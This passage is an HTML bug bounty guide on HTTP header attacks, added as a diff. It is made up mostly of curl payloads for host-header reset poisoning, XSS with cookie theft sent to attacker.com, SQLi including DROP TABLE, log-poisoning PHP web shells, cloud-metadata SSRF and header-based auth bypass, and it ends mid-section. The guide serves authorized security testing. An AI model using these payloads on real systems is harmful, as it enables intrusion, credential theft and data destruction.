@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Header-Based Testing for Bug Bounty</title>
+<style>
+body { margin: 0; padding: 0; font-family: Georgia, 'Noto Serif', serif; font-size: 11pt; line-height: 1.65; color: #2c3e50; }
+@page { size: A4; margin: 2.2cm 2cm; @top-center { content: string(doctitle); font-size: 9pt; color: #7f8c8d; } @bottom-center { content: counter(page); font-size: 9pt; color: #7f8c8d; } }
+@page cover { margin: 0; @top-center { content: none; } @bottom-center { content: none; } }
+@page toc { @top-center { content: none; } @bottom-center { content: none; } }
+body { string-set: doctitle ""; }
+h1 { string-set: doctitle content(); }
+
+.cover { page: cover; width: 210mm; height: 297mm; margin: 0; position: relative; overflow: hidden; page-break-after: always; background: linear-gradient(135deg, #0f0c29 0%, #302b63 40%, #24243e 100%); }
+.c-shape { position: absolute; border-radius: 50%; opacity: 0.07; }
+.c1 { width: 400px; height: 400px; background: #e94560; top: -100px; right: -100px; }
+.c2 { width: 300px; height: 300px; background: #0f3460; bottom: 50px; left: -80px; }
+.c3 { width: 200px; height: 200px; background: #e94560; bottom: -60px; right: 100px; }
+.lines { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, transparent, transparent 35px, rgba(255,255,255,0.015) 35px, rgba(255,255,255,0.015) 70px); }
+.cover-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); text-align: center; width: 82%; z-index: 5; }
+.cover-icon { font-size: 64pt; margin-bottom: 20px; }
+.cover-title { font-size: 38pt; font-weight: 700; color: #ffffff; margin: 0 0 12px 0; letter-spacing: 1px; text-transform: uppercase; }
+.cover-sub { font-size: 15pt; color: #e94560; margin-bottom: 50px; font-weight: 400; letter-spacing: 2px; }
+.cover-line { width: 80px; height: 3px; background: #e94560; margin: 0 auto 40px; }
+.cover-meta { font-size: 11pt; color: rgba(255,255,255,0.7); line-height: 2; }
+
+.toc-page { page: toc; page-break-after: always; padding-top: 30px; }
+.toc-title { font-size: 22pt; color: #1a1a2e; margin-bottom: 30px; border-bottom: 3px solid #e94560; padding-bottom: 10px; }
+.toc ul { list-style: none; padding: 0; margin: 0; }
+.toc li { margin: 10px 0; font-size: 11.5pt; }
+.toc a { text-decoration: none; color: #2c3e50; display: flex; align-items: baseline; }
+.toc a::after { content: leader('.') target-counter(attr(href url), page); flex-shrink: 0; margin-left: 8px; }
+.toc .l1 { font-weight: 600; }
+.toc .l2 { padding-left: 20px; font-size: 11pt; }
+
+h1 { font-size: 20pt; color: #1a1a2e; margin-top: 0; margin-bottom: 16px; padding-bottom: 8px; border-bottom: 2px solid #e94560; page-break-after: avoid; }
+h2 { font-size: 14pt; color: #16213e; margin-top: 24px; margin-bottom: 10px; padding-left: 10px; border-left: 4px solid #e94560; page-break-after: avoid; }
+h3 { font-size: 12pt; color: #0f3460; margin-top: 18px; margin-bottom: 8px; }
+
+.tip, .warn, .info { padding: 12px 16px; margin: 14px 0; border-radius: 4px; font-size: 10.5pt; page-break-inside: avoid; }
+.tip { background: #e8f5e9; border-left: 4px solid #4caf50; }
+.warn { background: #ffebee; border-left: 4px solid #f44336; }
+.info { background: #e3f2fd; border-left: 4px solid #2196f3; }
+.call-title { font-weight: 700; margin-bottom: 4px; font-size: 10.5pt; }
+
+pre { background: #1e1e2e; color: #c7d0d9; padding: 14px 16px; border-radius: 6px; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 9pt; line-height: 1.5; margin: 12px 0; page-break-inside: avoid; max-width: 100%; white-space: pre-wrap; word-break: break-all; }
+code { font-family: 'JetBrains Mono', monospace; font-size: 9.5pt; background: #f0f0f0; padding: 2px 6px; border-radius: 3px; color: #e94560; }
+pre code { background: none; padding: 0; color: inherit; }
+
+table { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 10pt; page-break-inside: avoid; max-width: 100%; }
+thead { display: table-header-group; }
+thead tr { border-top: 2px solid #1a1a2e; border-bottom: 2px solid #1a1a2e; }
+th { padding: 10px 8px; text-align: left; font-weight: 600; color: #1a1a2e; background: #f8f9fa; }
+td { padding: 8px; border-bottom: 1px solid #ddd; vertical-align: top; }
+tbody tr:last-child { border-bottom: 2px solid #1a1a2e; }
+tr { page-break-inside: avoid; }
+
+.badge { display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 8.5pt; font-weight: 600; margin-right: 6px; }
+.b-passive { background: #e8f5e9; color: #2e7d32; }
+.b-active { background: #ffebee; color: #c62828; }
+.b-tool { background: #e3f2fd; color: #1565c0; }
+.b-tip { background: #fff3e0; color: #e65100; }
+
+.dork { background: #f8f9fa; border: 1px solid #e0e0e0; border-radius: 6px; padding: 12px 14px; margin: 10px 0; page-break-inside: avoid; }
+.dork-title { font-weight: 700; color: #1a1a2e; margin-bottom: 6px; font-size: 11pt; }
+.dork-desc { font-size: 10pt; color: #555; margin-bottom: 8px; }
+.dork-tags { margin-top: 8px; }
+
+.section { margin-bottom: 10px; }
+p { margin: 8px 0; }
+ul, ol { margin: 8px 0; padding-left: 24px; }
+li { margin: 4px 0; }
+strong { color: #1a1a2e; }
+</style>
+</head>
+<body>
+
+<div class="cover">
+  <div class="c-shape c1"></div>
+  <div class="c-shape c2"></div>
+  <div class="c-shape c3"></div>
+  <div class="lines"></div>
+  <div class="cover-content">
+    <div class="cover-icon">&#128270;</div>
+    <h1 class="cover-title" style="border:none;color:#fff;padding:0;margin:0 0 12px 0;">Header-Based Testing</h1>
+    <p class="cover-sub">Bug Bounty Hunting Guide</p>
+    <div class="cover-line"></div>
+    <div class="cover-meta">
+      <p>Host Injection | XSS | SQLi | LFI | SSRF</p>
+      <p>X-Forwarded | Cache Poisoning | Auth Bypass</p>
+      <p style="margin-top:20px;">2025 Edition</p>
+    </div>
+  </div>
+</div>
+
+<div class="toc-page">
+  <h1 class="toc-title">Table of Contents</h1>
+  <nav class="toc">
+    <ul>
+      <li class="l1"><a href="#s1">1. Introduction to Header Attacks</a></li>
+      <li class="l1"><a href="#s2">2. Host Header Injection</a></li>
+      <li class="l2"><a href="#s2-1">2.1 Password Reset Poisoning</a></li>
+      <li class="l2"><a href="#s2-2">2.2 Web Cache Poisoning</a></li>
+      <li class="l2"><a href="#s2-3">2.3 Virtual Host Discovery</a></li>
+      <li class="l1"><a href="#s3">3. X-Forwarded-* Family</a></li>
+      <li class="l2"><a href="#s3-1">3.1 X-Forwarded-For IP Spoofing</a></li>
+      <li class="l2"><a href="#s3-2">3.2 X-Forwarded-Host Injection</a></li>
+      <li class="l2"><a href="#s3-3">3.3 X-Original-URL / X-Rewrite-URL</a></li>
+      <li class="l1"><a href="#s4">4. XSS via HTTP Headers</a></li>
+      <li class="l2"><a href="#s4-1">4.1 User-Agent XSS</a></li>
+      <li class="l2"><a href="#s4-2">4.2 Referer / X-Forwarded-Host XSS</a></li>
+      <li class="l1"><a href="#s5">5. SQL Injection via Headers</a></li>
+      <li class="l2"><a href="#s5-1">5.1 User-Agent SQLi</a></li>
+      <li class="l2"><a href="#s5-2">5.2 X-Forwarded-For SQLi</a></li>
+      <li class="l2"><a href="#s5-3">5.3 Cookie-Based SQLi</a></li>
+      <li class="l1"><a href="#s6">6. LFI / RCE via Headers</a></li>
+      <li class="l2"><a href="#s6-1">6.1 X-Original-URL Path Traversal</a></li>
+      <li class="l2"><a href="#s6-2">6.2 X-HTTP-Method-Override Abuse</a></li>
+      <li class="l1"><a href="#s7">7. Open Redirect / SSRF via Headers</a></li>
+      <li class="l1"><a href="#s8">8. Cache Poisoning via Headers</a></li>
+      <li class="l1"><a href="#s9">9. Auth Bypass via Headers</a></li>
+      <li class="l1"><a href="#s10">10. Complete Header Wordlist</a></li>
+      <li class="l1"><a href="#s11">11. One-Liners &amp; Automation</a></li>
+      <li class="l1"><a href="#s12">12. Tips &amp; Tricks</a></li>
+    </ul>
+  </nav>
+</div>
+
+<!-- ==================== SECTION 1 ==================== -->
+<div class="section" id="s1">
+<h1>1. Introduction to Header Attacks</h1>
+
+<p>HTTP headers are a frequently overlooked attack vector in bug bounty hunting. Applications often trust headers for routing, authentication, logging, and access control decisions. When these headers are attacker-controllable, they can lead to XSS, SQL injection, authentication bypass, SSRF, cache poisoning, and more.</p>
+
+<div class="info">
+  <div class="call-title">Why Headers Are Powerful</div>
+  Headers bypass URL-based WAF rules, are invisible in normal browsing, often bypass rate limiting (different IP logged), and can reach internal routing logic that normal requests do not. Many frameworks (Django, Rails, Express, ASP.NET) inspect specific headers for core functionality.
+</div>
+
+<table>
+<thead><tr><th>Header Category</th><th>Common Headers</th><th>Attack Type</th></tr></thead>
+<tbody>
+<tr><td>Routing</td><td>Host, X-Forwarded-Host, X-Original-URL</td><td>SSRF, open redirect, cache poisoning</td></tr>
+<tr><td>Client IP</td><td>X-Forwarded-For, X-Real-IP, X-Client-IP</td><td>IP bypass, SQLi, XSS, log injection</td></tr>
+<tr><td>Auth</td><td>X-Internal-Auth, Authorization, X-Api-Key</td><td>Auth bypass, privilege escalation</td></tr>
+<tr><td>Content</td><td>Content-Type, Accept, X-HTTP-Method-Override</td><td>Method override, content bypass</td></tr>
+<tr><td>Browser Info</td><td>User-Agent, Referer, Origin</td><td>XSS, SQLi, log injection, redirect</td></tr>
+<tr><td>Cache</td><td>X-Cache, X-Forwarded-Host, Host</td><td>Web cache poisoning, DoS</td></tr>
+</tbody>
+</table>
+
+</div>
+
+<!-- ==================== SECTION 2 ==================== -->
+<div class="section" id="s2">
+<h1>2. Host Header Injection</h1>
+
+<p>The <code>Host</code> header tells the server which website the client wants. When an application uses the Host header to generate links, reset passwords, or route requests without validation, it becomes a critical vulnerability.</p>
+
+<h2 id="s2-1">2.1 Password Reset Poisoning</h2>
+
+<p>When a password reset email contains a reset link, the application often uses the Host header to construct the URL. If you can control the Host header, the reset link is sent to your server instead.</p>
+
+<pre># Host Header Password Reset Poisoning
+curl -X POST https://target.com/api/forgot-password \
+  -H "Host: attacker.com" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"victim@target.com"}'
+
+# If vulnerable, the reset link becomes:
+# https://attacker.com/reset?token=abc123
+
+# With X-Forwarded-Host to bypass simple Host filtering
+curl -X POST https://target.com/api/forgot-password \
+  -H "Host: target.com" \
+  -H "X-Forwarded-Host: attacker.com" \
+  -d '{"email":"victim@target.com"}'
+
+# Double Host header (some parsers use the last one)
+curl -X POST https://target.com/api/forgot-password \
+  -H "Host: target.com" \
+  -H "Host: attacker.com" \
+  -d '{"email":"victim@target.com"}'
+
+# Using X-Forwarded-Server or X-HTTP-Host-Override
+curl -X POST https://target.com/api/forgot-password \
+  -H "Host: target.com" \
+  -H "X-Forwarded-Server: attacker.com" \
+  -d '{"email":"victim@target.com"}'</pre>
+
+<div class="tip">
+  <div class="call-title">Password Reset Tip</div>
+  Always test with both <strong>Host</strong> and <strong>X-Forwarded-Host</strong>. Many applications read X-Forwarded-Host when behind a load balancer or CDN, trusting it as the true host. Check the actual reset email or response to confirm the poisoned link.
+</div>
+
+<h2 id="s2-2">2.2 Web Cache Poisoning</h2>
+
+<p>If a cache stores responses based on the Host header and the application reflects the Host header in the response, you can poison the cache to serve malicious content to all users.</p>
+
+<pre># Step 1: Check if Host is reflected in response
+curl -s -H "Host: attacker.com" https://target.com/ | grep attacker.com
+
+# Step 2: If reflected, check cache behavior
+curl -s -I -H "Host: attacker.com" https://target.com/ | grep -i cache
+
+# Step 3: Poison cache with XSS payload via Host
+curl -s -H "Host: <script>alert(1)</script>" https://target.com/
+
+# Step 4: Verify cache stores poisoned response
+curl -s https://target.com/ | grep "alert"
+
+# X-Forwarded-Host poisoning for CDN-backed sites
+curl -s -H "X-Forwarded-Host: attacker.com" https://target.com/ | grep attacker.com
+
+# Port-based cache poisoning
+curl -s -H "Host: target.com:8888" https://target.com/</pre>
+
+<div class="warn">
+  <div class="call-title">Cache Poisoning Warning</div>
+  Do NOT test cache poisoning on production without explicit scope permission. A successful cache poisoning affects all users. Document the vulnerability theoretically, then confirm with the program before demonstrating.
+</div>
+
+<h2 id="s2-3">2.3 Virtual Host Discovery</h2>
+
+<p>Changing the Host header can reveal different applications running on the same IP. This is especially useful for shared hosting, CDN origins, and internal virtual hosts.</p>
+
+<pre># Basic virtual host fuzzing
+curl -s -H "Host: admin.target.com" https://target.com/ -o /dev/null -w "%{http_code}"
+
+curl -s -H "Host: api.target.com" https://target.com/ -o /dev/null -w "%{http_code}"
+
+curl -s -H "Host: dev.target.com" https://target.com/ -o /dev/null -w "%{http_code}"
+
+# Automated vhost discovery with ffuf
+ffuf -u https://target.com -H "Host: FUZZ.target.com" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -fs 0 -mc 200,301,302,401,403
+
+# Using x8 for header-based discovery
+x8 -u https://target.com -w vhosts.txt -H "Host: FUZZ"
+
+# Compare responses to identify different virtual hosts
+curl -s -H "Host: target.com" https://1.2.3.4/ > baseline.html
+curl -s -H "Host: admin.target.com" https://1.2.3.4/ > admin.html
+diff baseline.html admin.html</pre>
+
+</div>
+
+<!-- ==================== SECTION 3 ==================== -->
+<div class="section" id="s3">
+<h1>3. X-Forwarded-* Family</h1>
+
+<h2 id="s3-1">3.1 X-Forwarded-For IP Spoofing</h2>
+
+<p>Applications behind load balancers or proxies often use X-Forwarded-For to identify the client's real IP. If the application trusts this header for rate limiting, access control, or logging, you can manipulate it.</p>
+
+<pre># Bypass IP-based rate limiting
+curl -s https://target.com/api/login \
+  -H "X-Forwarded-For: 1.2.3.4" \
+  -d "username=admin&password=wrong"
+
+# Rotate IP with each request
+curl -s https://target.com/api/login \
+  -H "X-Forwarded-For: 192.168.1.$((RANDOM % 255))" \
+  -d "username=admin&password=wrong"
+
+# Bypass IP whitelist (internal IP)
+curl -s https://target.com/api/admin \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Real-IP: 127.0.0.1"
+
+# Multiple X-Forwarded-For (some parsers use first, some last)
+curl -s https://target.com/api/admin \
+  -H "X-Forwarded-For: 127.0.0.1, 1.2.3.4" \
+  -H "X-Forwarded: 127.0.0.1" \
+  -H "X-Cluster-Client-IP: 127.0.0.1" \
+  -H "X-Client-IP: 127.0.0.1" \
+  -H "X-Real-IP: 127.0.0.1" \
+  -H "CF-Connecting-IP: 127.0.0.1" \
+  -H "True-Client-IP: 127.0.0.1"
+
+# Client IP header wordlist for bypass testing
+cat > ip_headers.txt << 'EOF'
+X-Forwarded-For
+X-Forwarded
+X-Cluster-Client-IP
+X-Client-IP
+X-Real-IP
+CF-Connecting-IP
+True-Client-IP
+Fastly-Client-IP
+Forwarded-For
+Forwarded
+X-Originating-IP
+X-Remote-IP
+X-Remote-Addr
+EOF
+
+ffuf -u https://target.com/api/admin -H "FUZZ: 127.0.0.1" \
+  -w ip_headers.txt -fs 0 -mc 200</pre>
+
+<table>
+<thead><tr><th>Header</th><th>Used By</th><th>Purpose</th></tr></thead>
+<tbody>
+<tr><td><code>X-Forwarded-For</code></td><td>Nginx, AWS ALB, HAProxy</td><td>Original client IP chain</td></tr>
+<tr><td><code>X-Real-IP</code></td><td>Nginx</td><td>Client IP via proxy</td></tr>
+<tr><td><code>CF-Connecting-IP</code></td><td>Cloudflare</td><td>Original client IP</td></tr>
+<tr><td><code>True-Client-IP</code></td><td>Cloudflare Enterprise, Akamai</td><td>Original client IP</td></tr>
+<tr><td><code>Fastly-Client-IP</code></td><td>Fastly CDN</td><td>Original client IP</td></tr>
+<tr><td><code>X-Cluster-Client-IP</code></td><td>Google Cloud LB</td><td>Client IP</td></tr>
+<tr><td><code>Forwarded</code></td><td>RFC 7239 standard</td><td>Structured forwarding info</td></tr>
+</tbody>
+</table>
+
+<h2 id="s3-2">3.2 X-Forwarded-Host Injection</h2>
+
+<pre># Redirect chain manipulation
+curl -s -I -H "X-Forwarded-Host: attacker.com" https://target.com/redirect
+
+# Link generation poisoning
+curl -s -H "X-Forwarded-Host: attacker.com" https://target.com/sitemap.xml
+
+# JavaScript dynamic URL generation
+curl -s -H "X-Forwarded-Host: attacker.com" https://target.com/app.js | grep attacker.com
+
+# Open redirect via X-Forwarded-Host
+curl -s -I -H "X-Forwarded-Host: evil.com" https://target.com/login?redirect=/home
+# Response Location header may become: https://evil.com/login?redirect=/home
+
+# SSRF via X-Forwarded-Host
+curl -s -H "X-Forwarded-Host: 169.254.169.254" https://target.com/api/config
+
+# Cache key poisoning with X-Forwarded-Host
+curl -s -H "X-Forwarded-Host: attacker.com" https://target.com/static/app.js</pre>
+
+<h2 id="s3-3">3.3 X-Original-URL / X-Rewrite-URL</h2>
+
+<p>Some proxies and frameworks (particularly IIS with URL Rewrite, some PHP frameworks, and Apache mod_rewrite configurations) honor X-Original-URL or X-Rewrite-URL to determine the requested path. This allows path override even when the URL path is fixed.</p>
+
+<pre># Access blocked admin endpoints via X-Original-URL
+curl -s https://target.com/public-page \
+  -H "X-Original-URL: /admin/users"
+
+# Bypass path-based ACLs
+curl -s https://target.com/api/v1/public \
+  -H "X-Rewrite-URL: /api/v1/admin/config"
+
+# Path traversal via X-Original-URL
+curl -s https://target.com/ \
+  -H "X-Original-URL: /../../etc/passwd"
+
+# Combined with method override
+curl -s https://target.com/ -X GET \
+  -H "X-Original-URL: /admin/delete-user?id=123" \
+  -H "X-HTTP-Method-Override: DELETE"
+
+# Nginx alias traversal with X-Original-URL
+curl -s https://target.com/static/ \
+  -H "X-Original-URL: /static../etc/passwd"</pre>
+
+</div>
+
+<!-- ==================== SECTION 4 ==================== -->
+<div class="section" id="s4">
+<h1>4. XSS via HTTP Headers</h1>
+
+<h2 id="s4-1">4.1 User-Agent XSS</h2>
+
+<p>When applications log or display the User-Agent header without proper sanitization, injecting XSS payloads can trigger stored or reflected XSS.</p>
+
+<pre># Basic User-Agent XSS test
+curl -s https://target.com/ \
+  -H "User-Agent: <script>alert(1)</script>" | grep "alert"
+
+# User-Agent reflected in error pages
+curl -s https://target.com/error \
+  -H "User-Agent: <img src=x onerror=alert(1)>" | grep "onerror"
+
+# User-Agent in analytics/tracking dashboard (stored XSS)
+curl -s https://target.com/api/track \
+  -H "User-Agent: <svg onload=alert(1)>" \
+  -H "Content-Type: application/json" \
+  -d '{"page":"/test"}'
+
+# Polyglot User-Agent payload
+curl -s https://target.com/ \
+  -H 'User-Agent: \'\"><script>alert(1)</script>'
+
+# User-Agent with template injection context
+curl -s https://target.com/ \
+  -H "User-Agent: {{constructor.constructor('alert(1)')()}}"
+
+# Blind User-Agent XSS (for admin dashboards)
+curl -s https://target.com/ \
+  -H "User-Agent: <img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"</pre>
+
+<h2 id="s4-2">4.2 Referer / X-Forwarded-Host XSS</h2>
+
+<pre># Referer header reflected XSS
+curl -s https://target.com/analytics \
+  -H "Referer: javascript:alert(1)" | grep "javascript"
+
+# X-Forwarded-Host reflected in links/JS
+curl -s https://target.com/app.js \
+  -H "X-Forwarded-Host: attacker.com<script>alert(1)</script>" | grep "alert"
+
+# Origin header XSS (if reflected in CORS or error)
+curl -s https://target.com/api \
+  -H "Origin: https://attacker.com<script>alert(1)</script>"
+
+# Host header reflected in page content
+curl -s https://target.com/ \
+  -H "Host: target.com<script>alert(1)</script>" | grep "alert"
+
+# Cookie-based XSS via cookie value reflection
+curl -s https://target.com/ \
+  -H "Cookie: session=<script>alert(1)</script>" | grep "alert"</pre>
+
+<div class="tip">
+  <div class="call-title">Finding Header XSS</div>
+  Check error pages, admin dashboards, analytics panels, and any page that displays "client information" (browser info, IP address, request details). These often reflect headers without proper encoding. Also check <code>Server:nginx/1.18.0</code> style error pages where request details are echoed.
+</div>
+
+</div>
+
+<!-- ==================== SECTION 5 ==================== -->
+<div class="section" id="s5">
+<h1>5. SQL Injection via Headers</h1>
+
+<h2 id="s5-1">5.1 User-Agent SQLi</h2>
+
+<p>Applications that log User-Agent strings to databases (analytics, security monitoring, bot detection) may insert the header directly into SQL queries without parameterization.</p>
+
+<pre># User-Agent SQL injection detection
+curl -s https://target.com/ \
+  -H "User-Agent: Mozilla' AND 1=1--" | grep -i "error\|mysql\|sql"
+
+curl -s https://target.com/ \
+  -H "User-Agent: Mozilla' AND 1=2--" | grep -i "error\|mysql\|sql"
+
+# Time-based blind User-Agent SQLi
+curl -s https://target.com/ \
+  -H "User-Agent: Mozilla' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+
+# MySQL User-Agent SQLi
+curl -s https://target.com/ \
+  -H "User-Agent: Mozilla' UNION SELECT null,null,version()--"
+
+# PostgreSQL User-Agent SQLi
+curl -s https://target.com/ \
+  -H "User-Agent: Mozilla' UNION SELECT null,null,current_database()--"
+
+# User-Agent SQLi via log entry viewing
+curl -s https://target.com/admin/logs \
+  -H "Cookie: session=ADMIN_TOKEN" | grep "Mozilla"
+# If admin panel shows user-agent logs, XSS in User-Agent can lead to admin XSS</pre>
+
+<h2 id="s5-2">5.2 X-Forwarded-For SQLi</h2>
+
+<pre># X-Forwarded-For SQL injection
+curl -s https://target.com/ \
+  -H "X-Forwarded-For: 127.0.0.1' AND 1=1--" | grep -i "sql\|error"
+
+# X-Forwarded-For time-based blind
+curl -s https://target.com/ \
+  -H "X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--"
+
+# X-Forwarded-For in ORDER BY clause
+curl -s https://target.com/api/users \
+  -H "X-Forwarded-For: 1.2.3.4' UNION SELECT null,null,version()--"
+
+# IP logging with IP format validation bypass
+curl -s https://target.com/ \
+  -H "X-Forwarded-For: 127.0.0.1'||(SELECT pg_sleep(5))||'"
+
+# X-Forwarded-For with stacked queries
+curl -s https://target.com/ \
+  -H "X-Forwarded-For: 127.0.0.1'; DROP TABLE users;--"</pre>
+
+<h2 id="s5-3">5.3 Cookie-Based SQLi</h2>
+
+<pre># Cookie SQL injection
+curl -s https://target.com/ \
+  -H "Cookie: session=abc123' AND 1=1--" | grep -i "sql\|error"
+
+# Session token SQLi (if token is looked up in DB)
+curl -s https://target.com/dashboard \
+  -H "Cookie: session=' UNION SELECT username,password FROM users--"
+
+# Time-based cookie SQLi
+curl -s https://target.com/dashboard \
+  -H "Cookie: session=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+
+# Cookie-based blind SQLi automation
+curl -s https://target.com/dashboard \
+  -H "Cookie: session=test' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--"</pre>
+
+</div>
+
+<!-- ==================== SECTION 6 ==================== -->
+<div class="section" id="s6">
+<h1>6. LFI / RCE via Headers</h1>
+
+<h2 id="s6-1">6.1 X-Original-URL Path Traversal</h2>
+
+<pre># LFI via X-Original-URL
+curl -s https://target.com/ \
+  -H "X-Original-URL: /etc/passwd"
+
+curl -s https://target.com/ \
+  -H "X-Original-URL: /../../../etc/passwd"
+
+# PHP wrapper LFI via X-Original-URL
+curl -s https://target.com/ \
+  -H "X-Original-URL: php://filter/convert.base64-encode/resource=/etc/passwd"
+
+# Log poisoning via User-Agent -> LFI -> RCE
+curl -s https://target.com/ \
+  -H "User-Agent: <?php system($_GET['cmd']); ?>"
+curl -s https://target.com/ \
+  -H "X-Original-URL: /var/log/apache2/access.log?cmd=id"
+
+# Nginx access log poisoning
+curl -s https://target.com/ \
+  -H "User-Agent: <?php system($_GET['cmd']); ?>"
+curl -s https://target.com/ \
+  -H "X-Original-URL: /var/log/nginx/access.log?cmd=id"
+
+# Proc filesystem access
+curl -s https://target.com/ \
+  -H "X-Original-URL: /proc/self/cmdline"
+
+curl -s https://target.com/ \
+  -H "X-Original-URL: /proc/self/environ"</pre>
+
+<h2 id="s6-2">6.2 X-HTTP-Method-Override Abuse</h2>
+
+<p>Some REST APIs accept X-HTTP-Method-Override to change the effective HTTP method. This can bypass method-based access controls.</p>
+
+<pre># Bypass GET-only restriction to execute DELETE
+curl -s https://target.com/api/users/123 \
+  -H "X-HTTP-Method-Override: DELETE" \
+  -H "Content-Type: application/json"
+
+# Bypass auth to access PUT endpoints
+curl -s https://target.com/api/users/123 \
+  -H "X-HTTP-Method-Override: PUT" \
+  -d '{"role":"admin"}'
+
+# Combine with X-Original-URL for path + method bypass
+curl -s https://target.com/public \
+  -H "X-Original-URL: /admin/users/123" \
+  -H "X-HTTP-Method-Override: DELETE"
+
+# Method override in frameworks
+# Rails: X-HTTP-Method-Override: DELETE
+# Laravel: X-HTTP-Method-Override
+# Django: X-HTTP-Method-Override
+# ASP.NET: X-HTTP-Method-Override</pre>
+
+</div>
+
+<!-- ==================== SECTION 7 ==================== -->
+<div class="section" id="s7">
+<h1>7. Open Redirect / SSRF via Headers</h1>
+
+<pre># Open redirect via Host header
+curl -s -I -H "Host: evil.com" https://target.com/redirect?to=/home
+# Check if Location header contains evil.com
+
+# SSRF via X-Forwarded-Host
+curl -s -H "X-Forwarded-Host: 169.254.169.254" \
+  https://target.com/api/internal-health | head -50
+
+# SSRF via Host on internal routing
+curl -s -H "Host: internal-api.target.com" \
+  https://target.com/api/proxy | head -50
+
+# SSRF via X-Original-URL
+curl -s https://target.com/ \
+  -H "X-Original-URL: http://169.254.169.254/latest/meta-data/"
+
+# SSRF via Referer (if server fetches Referer URL for preview)
+curl -s https://target.com/api/preview \
+  -H "Referer: http://169.254.169.254/latest/meta-data/"
+
+# SSRF via User-Agent (if server fetches User-Agent for browser info)
+curl -s https://target.com/api/browser-info \
+  -H "User-Agent: http://169.254.169.254/latest/meta-data/"
+
+# DNS rebinding via X-Forwarded-Host
+curl -s -H "X-Forwarded-Host: attacker.com" https://target.com/api/internal
+# Attacker DNS resolves to target internal IP on second query
+
+# Open redirect via Origin header
+curl -s -I https://target.com/api/redirect \
+  -H "Origin: https://evil.com"
+
+# Full SSRF header testing suite
+curl -s https://target.com/api/fetch \
+  -H "Host: 169.254.169.254" \
+  -H "X-Forwarded-Host: 169.254.169.254" \
+  -H "X-Original-URL: http://169.254.169.254/latest/meta-data/" \
+  -H "Referer: http://169.254.169.254"</pre>
+
+<div class="info">
+  <div class="call-title">Header SSRF Tip</div>
+  If an endpoint is protected from direct SSRF via URL parameters, always test the same endpoint with <strong>X-Forwarded-Host</strong>, <strong>Host</strong>, and <strong>X-Original-URL</strong>. Internal proxies may route based on headers while ignoring the actual URL.
+</div>
+
+</div>
+
+<!-- ==================== SECTION 8 ==================== -->
+<div class="section" id="s8">
+<h1>8. Cache Poisoning via Headers</h1>
+
+<pre># Step 1: Identify cache keys (headers included in cache key)
+curl -s -I https://target.com/ | grep -i "x-cache\|cf-cache\|akamai\|fastly"
+
+# Step 2: Test if Host header is in cache key
+curl -s -H "Host: attacker.com" https://target.com/ | grep attacker.com
+
+# Step 3: Test X-Forwarded-Host poisoning
+curl -s -H "X-Forwarded-Host: attacker.com" https://target.com/static/app.js
+
+# Step 4: Test Accept-Encoding header poisoning
+curl -s -H "Accept-Encoding: gzip, attacker" https://target.com/
+
+# Step 5: Test X-HTTP-Method-Override poisoning
+curl -s -H "X-HTTP-Method-Override: POST" https://target.com/
+
+# Step 6: Test cookie-based cache poisoning
+curl -s -H "Cookie: theme=<script>alert(1)</script>" https://target.com/
+
+# Step 7: Verify with clean request
+curl -s https://target.com/ | grep "alert\|attacker"
+
+# Apache mod_cache poisoning via X-Forwarded-Host
+curl -s -H "X-Forwarded-Host: attacker.com" \
+  -H "X-Forwarded-Proto: https" https://target.com/
+
+# Varnish cache poisoning
+curl -s -H "X-Forwarded-Host: attacker.com" \
+  https://target.com/ | grep attacker.com</pre>
+
+<table>
+<thead><tr><th>Header</th><th>Cache Poisoning Vector</th><th>Affected Caches</th></tr></thead>
+<tbody>
+<tr><td><code>Host</code></td><td>URL generation poisoning</td><td>Cloudflare, Fastly, Varnish</td></tr>
+<tr><td><code>X-Forwarded-Host</code></td><td>Backend link generation</td><td>Nginx (behind proxy), Rails</td></tr>
+<tr><td><code>X-Forwarded-Proto</code></td><td>HTTPS downgrade/links</td><td>AWS CloudFront, Cloudflare</td></tr>
+<tr><td><code>Accept-Encoding</code></td><td>Response body manipulation</td><td>Varnish, Nginx proxy_cache</td></tr>
+<tr><td><code>User-Agent</code></td><td>Content negotiation abuse</td><td>Most CDNs</td></tr>
+<tr><td><code>Cookie</code></td><td>Personalized content cache</td><td>Varnish, custom configs</td></tr>
+</tbody>
+</table>
+
+</div>
+
+<!-- ==================== SECTION 9 ==================== -->
+<div class="section" id="s9">
+<h1>9. Auth Bypass via Headers</h1>
+
+<pre># Internal network access bypass
+curl -s https://target.com/api/admin \
+  -H "X-Internal-Request: true" \
+  -H "X-Internal-Auth: true" \
+  -H "X-Internal: 1"
+
+# Debug mode bypass
+curl -s https://target.com/api/admin \
+  -H "X-Debug: true" \
+  -H "Debug: 1" \
+  -H "X-Debug-Mode: true"
+
+# Authorization header bypass variants
+curl -s https://target.com/api/admin \
+  -H "Authorization: Bearer admin" \
+  -H "X-Authorization: Bearer admin" \
+  -H "X-Api-Key: admin" \
+  -H "X-Admin: true"
+
+# Origin-based auth bypass (CORS misconfig)
+curl -s https://target.com/api/admin \
+  -H "Origin: https://target.com" \
+  -H "Referer: https://target.com/admin"
+
+# Reverse proxy auth bypass (NGINX real_ip)
+curl -s https://target.com/api/admin \
+  -H "X-Real-IP: 127.0.0.1" \
+  -H "X-Forwarded-For: 127.0.0.1"
+
+# Header-based role escalation
+curl -s https://target.com/api/profile \
+  -H "X-Role: admin" \
+  -H "X-User-Role: administrator" \
+  -H "X-Is-Admin: true"
+
+# JWT bypass via header confusion
+curl -s https://target.com/api/admin \
+  -H "Authorization: Bearer VALID_USER_TOKEN" \
+  -H "X-User-Id: ADMIN_USER_ID" \
+  -H "X-User-Role: admin"</pre>
+
+<div class="warn">
+  <div class="call-title">Auth Bypass Testing</div>
